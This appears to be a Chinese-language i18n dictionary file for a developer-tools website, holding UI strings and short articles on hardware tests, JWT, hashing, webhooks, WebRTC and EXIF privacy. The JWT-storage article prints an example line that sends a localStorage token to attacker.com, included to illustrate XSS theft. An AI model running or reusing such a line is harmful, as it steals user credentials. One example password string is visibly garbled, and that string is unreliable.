/**
 * 825412-portal - 国际化组件 (i18n Controller)
 * 预留全量多语言架构，支持无限扩充语种 (CN, EN, JP, ES, FR, DE...)
 */
const I18nController = {
  currentLang: 'zh-CN',

  // 1. 预留全量语言注册表（添加新语种只需在字典补充词条，系统会自动在菜单中渲染选项）
  supportedLanguages: [
    { code: 'zh-CN', name: '简体中文', flag: '🇨🇳' },
    { code: 'en-US', name: 'English', flag: '🇺🇸' },
    { code: 'ja-JP', name: '日本語 (Japanese)', flag: '🇯🇵' },
    { code: 'es-ES', name: 'Español (Spanish)', flag: '🇪🇸' },
    { code: 'fr-FR', name: 'Français (French)', flag: '🇫🇷' },
    { code: 'de-DE', name: 'Deutsch (German)', flag: '🇩🇪' }
  ],

  translations: {
    'zh-CN': {

      "dash_shortcut_screen": "屏幕坏点检测",
      "dash_shortcut_kb": "机械键盘测试",
      "dash_shortcut_mouse": "鼠标双击测速",


      "tool_screen_title": "在线显示器坏点/漏光/残影与色阶检测",
      "tool_screen_sub": "买新机与验屏必备：支持全屏纯色坏点检测、IPS 漏光诊断、256 级灰阶对比度与高刷残影测试。",
      "screen_mode1_title": "1. 纯色坏点/亮点检测",
      "screen_mode1_desc": "黑、白、红、绿、蓝、青、洋红、黄纯色全屏快速切屏，寻找像素坏点与暗点。",
      "screen_btn_start_solid": "进入纯色坏点检测 (全屏)",
      "screen_mode2_title": "2. 256 级灰阶与色阶测试",
      "screen_mode2_desc": "评估面板色彩过渡平滑度、暗部细节与高光层次，检测色彩断层。",
      "screen_btn_start_grad": "进入灰阶过渡测试",
      "screen_mode3_title": "3. 高刷动态残影 (Ghosting)",
      "screen_mode3_desc": "以不同速度渲染高速运动色块，肉眼观察像素响应时间与拖影情况。",
      "screen_btn_start_ghost": "进入动态残影测试",
      "screen_tip_title": "操作提示:",
      "screen_tip_text": "进入全屏后，点击鼠标左键或按键盘【空格键】/【方向键】切换下一个测试图样，按【ESC】随时退出全屏。",
      "tool_screen_doc_title": "显示器面板技术（IPS / OLED / Mini-LED）与 ISO 9241 像素缺陷等级规范",
      "tool_screen_doc_sub": "深入了解液晶排列、背光漏光成因、GtG 与 MPRT 响应时间差异及国家三包坏点判定标准。",
      "tool_screen_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">tv</span> 1. 坏点、亮点、暗点判定标准 (ISO 9241-307 Class II)</h3>
        <p>国际 ISO 9241 标准将屏幕像素缺陷分为三类：</p>
        <ul>
          <li><strong>亮点 (Hot Pixel)</strong>：在纯黑背景下持续发光的异常像素点（子像素晶体管短路无法关闭）；</li>
          <li><strong>暗点/死点 (Dead Pixel)</strong>：在纯白或纯色背景下完全不发光的黑点（驱动电路断路损坏）；</li>
          <li><strong>行业三包退换标准</strong>：通常 Class II 等级面板允许全屏不多于 2 个亮点或 5 个暗点；电竞级“完美屏 (Perfect Panel)”承诺 0 亮点。</li>
        </ul>
        <h3><span class="material-symbols-outlined" style="font-size: 18px;">speed</span> 2. GtG 灰阶响应时间与 MPRT 动态清晰度差异</h3>
        <p>很多商家宣传的 1ms 响应时间通常指 MPRT 插黑帧技术，而非真实的物理灰阶切换时间（GtG）。GtG 越慢，高刷下快速转动视角的拖影（Ghosting / Smearing）越严重。</p>`,

      "tool_kb_title": "机械键盘全键无冲与连击/延迟在线测试仪",
      "tool_kb_sub": "支持标准 87/104 键位实时点亮、NKRO 全键无冲最大并发数统计、轴体物理双击连击检测。",
      "kb_stat_tested": "已测按键:",
      "kb_stat_nkro": "最大并发按下:",
      "kb_stat_chatter": "连击/异常:",
      "kb_legend_tested": "绿色: 已通过测试",
      "kb_legend_pressing": "青色: 当前正处于按下状态",
      "kb_legend_chatter": "红色: 捕捉到物理微动双击/弹跳连击",
      "tool_kb_doc_title": "机械键盘防鬼键矩阵电路 (Anti-Ghosting) 与微动消抖算法 (Debounce)",
      "tool_kb_doc_sub": "深入解析全键无冲二极管矩阵原理、USB HID 报文描述符与机械轴体触点氧化引发的双击连击机制。",
      "tool_kb_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">keyboard</span> 1. 为什么普通薄膜键盘容易“鬼键 (Ghosting)”与冲突？</h3>
        <p>传统键盘采用行-列扫描矩阵。当用户同时按下 3 个形成矩形顶点的按键时，电流会倒灌触发第 4 个未被按下的虚假按键（称为鬼键）。机械键盘通过在每个轴体串联一个单向导通二极管（Diode），物理级隔绝电流回流，实现真正的全键无冲 (N-Key Rollover)。</p>
        <h3><span class="material-symbols-outlined" style="font-size: 18px;">timer</span> 2. 机械轴体双击连击（Chattering）的物理成因</h3>
        <p>轴体内部金属弹片在长期击打氧化或积灰后，闭合瞬间会产生多次异常机械抖动（Bouncing）。若主控消抖算法（Debounce Time）时间过短（<10ms），抖动会被识别为两次独立按压，即“连击双击”。</p>`,

      "tool_mouse_title": "鼠标微动双击检测与回报率 (Hz) 在线测试仪",
      "tool_mouse_sub": "支持毫秒级检测左/右/中键微动连击故障、实时捕获鼠标回报率轮询速度（125Hz~8000Hz）与滚轮平滑度。",
      "mouse_card1_title": "1. 微动双击/连击故障检测",
      "mouse_pad_hint": "在此区域连续快速点击鼠标（左键/右键/中键）",
      "mouse_pad_sub": "若检测到低于 80ms 的非预期快速连击，将触发双击警报",
      "mouse_btn_left": "左键点击:",
      "mouse_btn_right": "右键点击:",
      "mouse_fault_count": "异常双击:",
      "mouse_card2_title": "2. 鼠标回报率 (Polling Rate Hz) 实时测速",
      "mouse_hz_hint": "在此区域内持续划圆快速移动鼠标",
      "mouse_hz_sub": "实时捕捉 mousemove 事件间隔推算 USB 轮询频率",
      "mouse_curr_hz": "实时频率:",
      "mouse_peak_hz": "峰值频率:",
      "tool_mouse_doc_title": "鼠标机械微动老化接触氧化与 USB 轮询率 (Polling Rate) 原理解析",
      "tool_mouse_doc_sub": "深入解析传统金属簧片微动双击成因、光微动优势、1000Hz~8000Hz 超高回报率对 CPU 占用与游戏画面的影响。",
      "tool_mouse_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">mouse</span> 1. 鼠标微动物理双击的原理解剖</h3>
        <p>传统机械微动（如欧姆龙蓝点/灰点、TTC金微动）依赖弹簧片物理接触通电。随着使用时长增加，金属触点表面发生电弧烧蚀与轻微氧化，接触阻抗急剧上升，按压时产生剧烈杂波电压，导致系统误识别为多次点击（即双击连击）。光微动（Optical Switch）通过红外光栅遮断导通，彻底消除了物理触点磨损与双击可能。</p>
        <h3><span class="material-symbols-outlined" style="font-size: 18px;">speed</span> 2. 1000Hz vs 4000Hz/8000Hz 超高回报率技术解析</h3>
        <p>回报率（Polling Rate）决定鼠标主控每秒向操作系统报告位置的频率。1000Hz 对应 1ms 间隔，8000Hz 对应 0.125ms 间隔。超高回报率能大幅降低 240Hz/360Hz 电竞显示器上的鼠标光标微撕裂，但对单核 CPU 中断性能提出极高要求。</p>`,


      "dash_pub_title": "极客技术专栏与白皮书 (Technical Publications)",
      "dash_pub_sub": "由 825412.xyz 核心工程团队撰写的原创网络架构、密码学安全与前端图形算法深度指南。",
      "dash_pub_card1_title": "WebRTC 点对点通信内幕与 NAT 穿透握手白皮书 ➔",
      "dash_pub_card1_desc": "深入剖析 WebRTC P2P 浏览器底层连接原理：STUN 公网 IP 探测、ICE 候选地址协商、SDP 握手到 DTLS 加密分块流式传输。",
      "dash_pub_card2_title": "生产级 Webhook 消费端五大安全规范与幂等性 ➔",
      "dash_pub_card2_desc": "掌握反向 HTTP 回调设计模式、HMAC-SHA256 签名校验算法、时间戳防重放攻击与分布式排他锁幂等性消费方案。",
      "dash_pub_card3_title": "现代密码安全黄金法则：信息熵与 NIST 800-63B ➔",
      "dash_pub_card3_desc": "基于香农信息论推导密码熵计算公式 E = L × log2(N)，对比 8 卡 RTX 4090 集群暴力破解算力，解读长度优先准则。",
      "dash_pub_card4_title": "Web 安全深度剖析：千万不要在 LocalStorage 存 JWT ➔",
      "dash_pub_card4_desc": "深入探讨 XSS 跨站脚本攻击与 JWT 窃取风险：对比 LocalStorage 与 HttpOnly SameSite Cookie 的多层防御体系。",
      "dash_pub_card5_title": "单向散列函数演进史：从 MD5 到 Argon2 慢哈希 ➔",
      "dash_pub_card5_desc": "密码学散列演进历程：探讨 MD5 碰撞原理、SHA-256 算法内部结构，以及为什么存储用户密码必须使用 Argon2id / bcrypt。",
      "dash_pub_card6_title": "浏览器端图像处理与 EXIF GPS 隐私抹除实战 ➔",
      "dash_pub_card6_desc": "纯前端 Canvas 硬件加速图像压缩与元数据清洗：利用 HTML5 Canvas 实现 WebP 编码并物理级抹除拍摄地点经纬度。",
      "sitemap_title": "站点地图与开发者技术全站索引 (Sitemap)",
      "sitemap_sub": "汇集 825412.xyz 全网可访问的 20+ 个核心交互工具落地页、RFC/NIST 技术规范解读、开发专栏白皮书及合规政策。",
      "sitemap_sec1_title": "核心极客工具落地页",
      "sitemap_sec2_title": "核心平台应用与网络中枢",
      "sitemap_sec3_title": "开发者技术专栏与白皮书",
      "sitemap_sec4_title": "团队资质与法律合规",
      "sitemap_t1": "🔐 强密码生成器与 NIST 熵评估 ➔",
      "sitemap_t2": "📋 JSON 格式化校验与语法美化 ➔",
      "sitemap_t3": "🔑 JWT 在线解析调试器 (RFC 7519) ➔",
      "sitemap_t4": "⚡ MD5 / SHA-256 / SHA-512 哈希计算 ➔",
      "sitemap_t5": "⏰ Unix 时间戳与标准日期双向转换 ➔",
      "sitemap_t6": "📝 文本处理与 Base64 / URL 编解码 ➔",
      "sitemap_t7": "🖼️ 纯前端图片极限压缩与 EXIF 清洗 ➔",
      "sitemap_t8": "📶 WiFi 扫码直连二维码生成器 ➔",
      "sitemap_a1": "💻 825412.xyz 极客控制台与 NOC 监控 ➔",
      "sitemap_a2": "📡 WebRTC 极客隔空快传 (P2P AirDrop) ➔",
      "sitemap_a3": "🧪 Webhook 调试桩与 API 回显中继 ➔",
      "sitemap_a4": "📋 端到端加密匿名剪贴板 (Pastebin) ➔",
      "sitemap_a5": "🧰 极客开发者工具箱主面板 ➔",
      "sitemap_art1": "📖 WebRTC 点对点通信内幕与 NAT 穿透握手白皮书 ➔",
      "sitemap_art2": "📖 生产级 Webhook 消费端五大安全规范与幂等性 ➔",
      "sitemap_art3": "📖 现代密码安全黄金法则：信息熵与 NIST 800-63B ➔",
      "sitemap_art4": "📖 Web 安全：为什么千万不要在 LocalStorage 存 JWT ➔",
      "sitemap_art5": "📖 单向散列函数演进史：从 MD5 到 Argon2 慢哈希 ➔",
      "sitemap_art6": "📖 浏览器端图像处理与 EXIF GPS 隐私抹除实战 ➔",
      "sitemap_l1": "🏢 关于 825412.xyz 与工程团队声明 ➔",
      "sitemap_l2": "🛡️ 隐私政策 (Privacy Policy / GDPR / CCPA) ➔",
      "sitemap_l3": "📜 服务条款 (Terms of Service) ➔",
      "sitemap_l4": "✉️ 联系我们与技术支持 (Contact Us) ➔",


      "tool_card_json_doc_title": "JSON 规范 (RFC 8259) 与现代微服务数据序列化最佳实践",
      "tool_card_json_doc_sub": "掌握 JSON 语法树解析机制、大整数精度丢失问题、循环引用解决与序列化性能调优。",
      "tool_card_json_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">terminal</span> 1. JavaScript 64 位双精度浮点数与 19 位雪花算法 ID 丢失陷阱</h3>
        <p>在前后端交互中，最容易引发灾难性生产 Bug 的是后端生成的 64 位雪花算法（Snowflake ID）长整数（如 <code>1787219372183921823</code>）：</p>
        <ul>
          <li><strong>根因分析</strong>：JavaScript 中的所有 <code>Number</code> 均为 IEEE 754 双精度浮点数，其能够安全表示的最大整数为 <code>Number.MAX_SAFE_INTEGER</code> (即 2<sup>53</sup> - 1，即 <code>9007199254740991</code>，约 16 位)；</li>
          <li><strong>灾难现象</strong>：当后端返回超过 16 位的长整型 ID 时，前端 <code>JSON.parse()</code> 会自动将末尾几位数截断进位变异（如 <code>...823</code> 变成 <code>...800</code>），导致后续更新与查询无法命中目标记录；</li>
          <li><strong>企业级解决方案</strong>：后端必须将所有超过 15 位的 ID（Long 类型）在序列化阶段显式转换为 <strong>String 字符串格式</strong>（例如在 Java Jackson 中配置 <code>@JsonSerialize(using = ToStringSerializer.class)</code>，或在 Go 中使用 <code>json:",string"</code>）。</li>
        </ul>`,

      "tool_card_jwt_doc_title": "JWT (RFC 7519) 架构设计与生产级安全防线",
      "tool_card_jwt_doc_sub": "全面剖析无状态 Token 核心原理、None 算法漏洞、密钥爆破防御与 HttpOnly 安全存储模型。",
      "tool_card_jwt_gold_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 生产环境防御 JWT 伪造的四大黄金准则</h3>
        <ul>
          <li><strong>强制白名单算法校验</strong>：在服务端验证逻辑中显式指定允许的算法集合（例如 <code>algorithms=['HS256']</code>），坚决杜绝依赖 JWT Header 中自声明的 <code>alg</code>；</li>
          <li><strong>HMAC 密钥长度不低于 256 位</strong>：对称加密密钥 Secret 必须使用密码学真随机数生成（如 <code>openssl rand -base64 32</code>），严禁使用弱口令；</li>
          <li><strong>短生命周期 + Refresh Token 轮转</strong>：Access Token 有效期建议设置为 15~30 分钟，配合持久化存储的 Refresh Token 实现无感刷新与紧急吊销；</li>
          <li><strong>防 XSS 窃取</strong>：千万不要将 JWT 存在浏览器的 <code>localStorage</code> 中，应将其置于带有 <code>HttpOnly; Secure; SameSite=Strict</code> 属性的 Cookie 中传输。</li>
        </ul>`,

      "tool_card_hash_doc_title": "单向散列函数原理与慢哈希落库防护体系",
      "tool_card_hash_doc_sub": "深入了解哈希雪崩效应、抗原像性与抗碰撞性，以及 Argon2id、bcrypt 抵御 GPU 暴力破解的原理。",

      "tool_card_time_doc_title": "计算机时间系统与 2038 年危机 (Y2K38) 原理解析",
      "tool_card_time_doc_sub": "深入了解 Unix 纪元时间、闰秒调整机制与跨时区夏令时处理规范。",

      "tool_card_text_doc_title": "字符编码与 Base64 (RFC 4648) 数学原理",
      "tool_card_text_doc_sub": "深入了解 8-bit 二进制流转换为 6-bit 打印字符集的数学映射、填充符 '=' 机制与 UTF-8 变长编码模型。",
      "tool_card_text_b64_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">format_quote</span> Base64 编码为什么会使数据体积增加约 33%？</h3>
        <p>Base64 算法将每 3 个 8-bit 字节（共 24 bits）拆分为 4 个 6-bit 的单元（每个 6-bit 单元可对应 64 个可打印 ASCII 字符之一，即 2<sup>6</sup> = 64）：</p>
        <ul>
          <li><strong>体积计算</strong>：原始数据为 3 字节，编码后输出为 4 字节，数据体积膨胀比例为 <code>4 / 3 ≈ 1.333 (增加约 33.3%)</code>；</li>
          <li><strong>Padding 填充符</strong>：若原始数据字节数不是 3 的倍数，末尾会以 <code>=</code> 补齐 24 位对齐要求；</li>
          <li><strong>URL Safe 变体</strong>：标准 Base64 包含 <code>+</code> 和 <code>/</code>，在 URL 中会被误解析，因此 RFC 4648 提出了 Base64URL 规范，使用 <code>-</code> 替换 <code>+</code>，使用 <code>_</code> 替换 <code>/</code>，并省略尾部 <code>=</code>。</li>
        </ul>`,

      "tool_card_media_doc_title": "现代图像压缩算法 (WebP / AVIF) 与 EXIF 隐私安全白皮书",
      "tool_card_media_doc_sub": "深入了解离散余弦变换 (DCT)、预测编码与照片地理位置信息泄露风险。",
      "tool_card_media_exif_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">warning</span> 照片 EXIF 元数据泄露风险：为什么社交分享前必须脱敏？</h3>
        <p>现代智能手机相机在拍摄每一张照片时，默认都会将大量敏感硬件元数据写入图片头部（Exchangeable Image File Format，简称 EXIF）：</p>
        <ul>
          <li><strong>GPS 物理经纬度 (精确到 1 米)</strong>：照片直接记录了拍摄者的住宅楼层、家庭住址或办公地点；</li>
          <li><strong>时间戳与相机设备序列号</strong>：记录精确到毫秒的拍摄时间与设备 IMEI/序列号，极易被用于关联个人身份；</li>
          <li><strong>纯前端防御原理</strong>：通过 HTML5 <code>Canvas.drawImage()</code> 将图片像素重绘并导出，底层会直接丢弃所有 EXIF Header 二进制块，实现真正的 100% 物理级隐私擦除。</li>
        </ul>`,

      "tool_card_wifi_doc_title": "WiFi Alliance Easy Connect 规范与 WPA3 握手安全",
      "tool_card_wifi_doc_sub": "了解国际标准 WiFi 二维码 URI 格式与 Simultaneous Authentication of Equals (SAE) 防破解协议。",
      "tool_card_wifi_spec_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">qr_code_2</span> WiFi 二维码国际标准协议语法详解</h3>
        <p>iOS (iOS 11+) 与 Android (Android 10+) 原生相机均内置了对 WiFi 二维码标准 URI 的解析器：</p>
        <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #38bdf8; overflow-x: auto;"><code>WIFI:S:MyHome_WiFi;T:WPA;P:P@ssw0rd1234;H:false;;</code></pre>
        <ul>
          <li><code>S:</code> 代表网络 SSID（网络名称）；</li>
          <li><code>T:</code> 代表加密类型（<code>WPA</code>, <code>WEP</code>, 或 <code>nopass</code>）；</li>
          <li><code>P:</code> 代表预共享网络密码；</li>
          <li><code>H:</code> 代表是否为隐藏网络（<code>true</code> 或 <code>false</code>）。</li>
        </ul>`,


      "nav_articles": "极客技术专栏",
      "nav_sitemap": "全站索引",
      "nav_sitemap_html": "HTML 网站地图",
      "footer_rights_articles": "© 2026 825412.xyz 极客多功能工具箱 | 开发者原创技术文库",


      "art1_title": "WebRTC 点对点通信内幕与 NAT 穿透握手全流程白皮书",
      "art1_sub": "掌握浏览器无插件直接进行 P2P 大文件投送的核心底层机制：从信令服务器、STUN 穿透、ICE Candidates 收集到 DTLS 加密传输通道构建。",
      "art1_body": `<h2>一、为什么 WebRTC 是去中心化传输的终极解决方案？</h2>
      <p>在传统的 HTTP/WebSocket 客户端-服务端中转架构中，用户 A 向用户 B 发送一个 50MB 的压缩包，必须经过以下路径：<code>用户 A ➔ 云端存储服务器 ➔ 用户 B</code>。这种模式存在严重的带宽成本、服务器 CPU 开销与隐私留存隐患。</p>
      <p><strong>WebRTC (Web Real-Time Communication)</strong> 彻底颠覆了这种传统范式：它允许现代浏览器在没有任何中间存储服务器介入的情况下，在两台终端设备之间直接拉起一条端到端 UDP/SCTP 加密链路。</p>

      <h2>二、WebRTC 点对点直连握手四大核心阶段 (The 4-Step Lifecycle)</h2>
      <ol>
        <li><strong>信令协商 (Signaling Phase)</strong>：双方通过轻量级信令中继广播加入房间的指令，交换各自的 Session Description Protocol (SDP)；</li>
        <li><strong>STUN NAT 探测与 ICE 候选收集 (Candidate Gathering)</strong>：双方浏览器向公共 STUN 服务器（如 Google STUN）发送探测包，解析出当前设备在 NAT 路由器后的公网反射 IP 与内网本地 IP；</li>
        <li><strong>NAT 穿透打洞 (P2P Hole Punching)</strong>：双方根据收集到的 ICE Candidates 尝试进行双向 UDP 握手。若两台设备在同一局域网 WiFi 下，将直接走内网直连（传输速率跑满千兆物理带宽）；</li>
        <li><strong>DTLS 密钥协商与 SCTP 流式传输</strong>：握手成功后，双方基于 Datagram Transport Layer Security (DTLS) 建立 128/256 位加密通道，大文件以 64KB 二进制 ArrayBuffer 分块流式喷射。</li>
      </ol>

      <h2>三、常见网络拓扑下的 P2P 穿透率分析</h2>
      <div class="doc-table-wrapper" style="margin: 20px 0;">
        <table class="doc-table">
          <thead>
            <tr><th>网络环境类型</th><th>NAT 类型</th><th>P2P 直连成功率</th><th>传输延迟表现</th></tr>
          </thead>
          <tbody>
            <tr><td><strong>同局域网 WiFi / 公司内网</strong></td><td>Full Cone / Restricted</td><td><span style="color:#10b981; font-weight:700;">100% (内网直连)</span></td><td>&lt; 2ms (满速千兆)</td></tr>
            <tr><td><strong>家庭宽带跨省市直连</strong></td><td>Port Restricted Cone</td><td><span style="color:#10b981; font-weight:700;">&gt; 92% (STUN 打洞)</span></td><td>15ms ~ 40ms</td></tr>
            <tr><td><strong>移动 4G/5G 蜂窝网络互联</strong></td><td>Symmetric NAT</td><td><span style="color:#f59e0b; font-weight:700;">约 75%</span></td><td>30ms ~ 80ms</td></tr>
          </tbody>
        </table>
      </div>`,

      "art2_title": "生产级 Webhook 消费端五大安全规范与分布式幂等性",
      "art2_sub": "对外暴露公网 HTTP 回调端点极易受到黑客伪造请求、计时攻击或重复投递。本文总结了 GitHub、Stripe、微信支付等万亿级回调网关的通用防御架构。",
      "art2_body": `<h2>一、Webhook 为什么比传统 HTTP 轮询 (Polling) 强 10 倍？</h2>
      <p>传统轮询模式下，客户端每 3 秒发起一次 <code>GET /orders/status</code> 查询，99% 的请求返回“无变化”，白白消耗了服务器带宽与数据库连接池。而 Webhook 采用反向事件驱动架构，仅在事件实际发生时主动触发一次 POST 回调，降低 90% 以上的基础设施成本。</p>

      <h2>二、生产级 Webhook 消费端五大安全铁律</h2>
      <ol>
        <li><strong>HMAC-SHA256 签名防伪造</strong>：消费端必须使用预共享密钥 <code>Secret</code> 对请求 Raw Body 计算散列，并使用常量时间比较函数（如 <code>hmac.compare_digest</code>）比对签名，彻底杜绝计时攻击 (Timing Attack)；</li>
        <li><strong>时间戳防重放攻击 (Anti-Replay Window)</strong>：严格校验 Header 中的 <code>X-Timestamp</code>，超过 300 秒（5分钟）的请求直接丢弃；</li>
        <li><strong>分布式消费幂等性 (Idempotency Key)</strong>：网络超时重试会导致同一事件被投递多次。消费端必须将 <code>event_id</code> 写入 Redis 分布式排他锁或数据库唯一约束；</li>
        <li><strong>500ms 快速响应与异步队列解耦</strong>：接收到请求后在 500ms 内向发送方返回 <code>200 OK</code>，耗时业务逻辑通过消息队列（RabbitMQ / Kafka / Celery）异步消费；</li>
        <li><strong>IP 白名单与 TLS 1.3 强制加密</strong>：限制仅允许上游网关的 CIDR 节点访问，防止中间人嗅探。</li>
      </ol>`,

      "art3_title": "现代密码安全黄金法则：信息熵数学模型与 NIST SP 800-63B 深度解析",
      "art3_sub": "为什么传统强制包含大小写和特殊符号反而降低了安全性？深入解析美国国家标准技术研究所最新数字身份指南与密码学真随机数规范。",
      "art3_body": `<h2>一、密码信息熵 (Shannon Entropy) 的数学推导</h2>
      <p>密码信息熵代表猜测一个随机密码所需的平均不确定度（单位：Bits）。计算公式如下：</p>
      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 14px; color: #38bdf8;"><code>E = L × log2(N)</code></pre>
      <ul>
        <li><code>L</code>：密码长度（字符位数）；</li>
        <li><code>N</code>：密码字符集可能空间（如 26 个小写字母 + 26 个大写字母 + 10 个数字 + 32 个特殊符号 = 94）。</li>
      </ul>
      <p>例如，一个 16 位全字符集随机密码的信息熵为：<code>16 × log2(94) ≈ 16 × 6.55 = 104.8 Bits</code>。以每秒 1000 亿次尝试的算力集群穷举，需耗时数亿年，具备军工级抗爆破能力。</p>

      <h2>二、NIST SP 800-63B 颠覆传统的两大核心结论</h2>
      <ol>
        <li><strong>废除定期强制改密</strong>：频繁改密导致用户倾向于只修改末尾数字（如 <code>Pass123! ➔ Pass124!</code>），极大降低了实际熵值；</li>
        <li><strong>长度优先于单纯复杂度</strong>：一个由 4 个随机英文单词组成的口令短语（如 <code>correct-horse-battery-staple</code>，长 28 位），比一个 8 位难记的复杂字符（如 <code>P@s'zh-CN': {!</code>）安全数万倍！</li>
      </ol>`,

      "art4_title": "Web 安全深度剖析：为什么千万不要在 LocalStorage 中存放 JWT 令牌？",
      "art4_sub": "许多前端开发者习惯将 Access Token 随手存入 window.localStorage，但这为跨站脚本攻击 (XSS) 敞开了致命大门。本文为您梳理最佳防御范式。",
      "art4_body": `<h2>一、LocalStorage 的致命软肋：对任意 JavaScript 完全开放</h2>
      <p>任何运行在当前页面上下文的 JavaScript 脚本（包括第三方分析 SDK、未严格清洗的用户评论富文本、被篡改的 NPM 依赖包），都可以通过一行简单的代码直接读取并外发凭据：</p>
      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #f87171;"><code>fetch(https://attacker.com/steal?token= + localStorage.getItem(access_token));</code></pre>

      <h2>二、终极防御体系：HttpOnly Cookie + 短期 Token + 内存隔离</h2>
      <p>推荐采用行业标准的防御组合拳：</p>
      <ul>
        <li><strong>Access Token 驻留 JavaScript 内存</strong>：前端在应用启动时向认证中心请求 Token 并保存在变量或状态管理（Vuex / Redux）中，页面关闭即销毁；</li>
        <li><strong>Refresh Token 存入 HttpOnly Cookie</strong>：服务端下发 Refresh Token 时设置 <code>Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict</code>，浏览器底层严禁任何 JS 访问该 Cookie，从根本上免疫 XSS 窃取；</li>
        <li><strong>自动无感静默续期</strong>：当内存中的 Access Token 即将过期时，自动调用刷新接口利用 Cookie 换取新的短效 Token。</li>
      </ul>`,

      "art5_title": "单向散列函数演进史：从 MD5 碰撞到 Argon2 抗 GPU 爆破慢哈希实战",
      "art5_sub": "为什么绝不能用 MD5 或 SHA-256 直接存储用户登录密码？深入理解“快哈希”与“慢哈希”的本质差异与工业界选型指南。",
      "art5_body": `<h2>一、快哈希与慢哈希的本质区别</h2>
      <p>密码学散列分为两个截然不同的设计方向：</p>
      <ul>
        <li><strong>快哈希 (Fast Hash - 如 SHA-256, BLAKE3)</strong>：目标是极速计算，用于校验大文件完整性与数字签名。现代 8 卡 RTX 4090 集群每秒可计算数百亿次 SHA-256；</li>
        <li><strong>慢哈希 (Slow / Memory-Hard Hash - 如 Argon2id, bcrypt, PBKDF2)</strong>：专为密码落库设计，故意引入极高的计算轮数与高内存占用（Memory Cost），迫使攻击者的 GPU 显存耗尽，将单次穷举成本提高上百万倍。</li>
      </ul>

      <h2>二、现代工业界密码存储首选：Argon2id 规范</h2>
      <p>Argon2 荣获国际密码哈希竞赛 (PHC) 冠军，结合了防御侧信道攻击的 Argon2d 与防御 GPU 并行计算的 Argon2i：</p>
      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #10b981;"><code>$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$...</code></pre>
      <p>参数说明：<code>m=65536</code> (分配 64MB 内存), <code>t=3</code> (迭代 3 轮), <code>p=4</code> (4 个并行线程)。</p>`,

      "art6_title": "浏览器端图像处理与隐私防御：Canvas 算法与 EXIF GPS 抹除实战",
      "art6_sub": "如何实现 100% 不经任何服务器中转的纯本地极速图片压缩？深入解析 HTML5 Canvas 硬件加速、动态缩放双三次插值与元数据剥离方案。",
      "art6_body": `<h2>一、传统服务端图片处理的缺陷</h2>
      <p>将高清大图（如 10MB 的手机原图）上传给后端服务器进行处理存在两大痛点：一是上传和下载消耗双倍带宽并产生数秒等待；二是用户敏感照片留存在第三方云端存储中存在数据合规隐患。</p>

      <h2>二、纯前端 Canvas 方案的四大核心优势</h2>
      <ol>
        <li><strong>零云端留存</strong>：图片直接加载到浏览器内存 Blob / ArrayBuffer，处理完毕立即释放，物理级零泄露；</li>
        <li><strong>GPU 硬件加速重绘</strong>：利用底层图形加速器，5MB 照片压缩至 500KB 的 WebP 耗时通常在 200ms 以内；</li>
        <li><strong>天然元数据剥离</strong>：<code>Canvas.drawImage()</code> 仅读取原始像素流，所有包含拍摄地点 GPS 与设备序列号的 EXIF Header 数据块会被底层直接丢弃；</li>
        <li><strong>现代格式支持</strong>：原生支持输出高压缩比的 WebP 格式，在相同视觉质量下相比传统 JPEG 体积减小 30%~50%。</li>
      </ol>`,


      'clip_input_ph': '// 在这里粘贴你的文本或代码...',
      'tool_json_ph': '在此粘贴待校验或格式化的 JSON 字符串...',
      'tool_jwt_ph': '在此粘贴 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      'tool_hash_ph': '在此输入需要计算散列哈希的任意文本或密码字符串...',
      'tool_hash_compare_ph': '在此粘贴官方提供的 MD5 / SHA-256 校验码，系统将自动进行毫秒级一致性比对...',
      'airdrop_room_ph': '输入或切换自定义频道码...',


      'pwd_strength_val': '极高 (Military Grade)',
      'pwd_entropy_init': '熵值: 95.2 Bits',
      'pwd_crack_init': '约 3.2 亿年 (RTX 4090 集群)',
      'pwd_charset_init': '94 个可能字符 (N)',
      'pwd_nist_init': '符合 NIST SP 800-63B 标准',
      'hash_file_info_init': '📄 文件信息',
      'hash_calc_status_init': '⚡ 计算完成',
      'time_input_ts_ph': '输入10位时间戳',
      'time_output_dt_ph': '转换结果',


      'clip_opt_1h': '1 小时后失效',
      'clip_opt_24h': '24 小时后失效',
      'clip_opt_7d': '7 天后失效',
      'clip_create_btn': '创建分享链接',
      'clip_res_title': '分享结果',
      'clip_res_link_label': '你的分享链接 (点击复制):',
      'clip_history_title': '本地历史记录',
      'clip_doc_title': '匿名剪贴板使用指南与隐私安全架构',
      'clip_doc_sub': '了解端到端临时加密存储、自毁定时器与零用户痕迹模型。',
      'clip_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">share</span> 1. 匿名剪贴板是如何工作的？</h3><p>您可以在输入框中粘贴任何代码片段、配置文件、SQL 语句或临时笔记，选择到期时间后点击“创建分享链接”。系统将生成唯一的 Hash 分享地址（如 <code>#paste=xxxx</code>）。收到链接的接收者直接打开网页即可在弹窗中一键阅读与复制。</p>',
      'clip_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">timer_off</span> 2. 内容安全与过期自毁机制</h3><p>系统支持 1小时、24小时和 7天三种自毁期限。一旦超出设定时间，云端数据将被彻底清除并无法恢复。我们不强制要求用户注册或提交任何个人身份信息，保障匿名与隐私。</p>',


      'search_placeholder': '指令搜索...',
      'wifi_enc_wpa': 'WPA / WPA2 / WPA3 (通用)',
      'wifi_enc_nopass': '无密码 (开放热点)',
      'wifi_enc_wep': 'WEP (极老旧设备)',
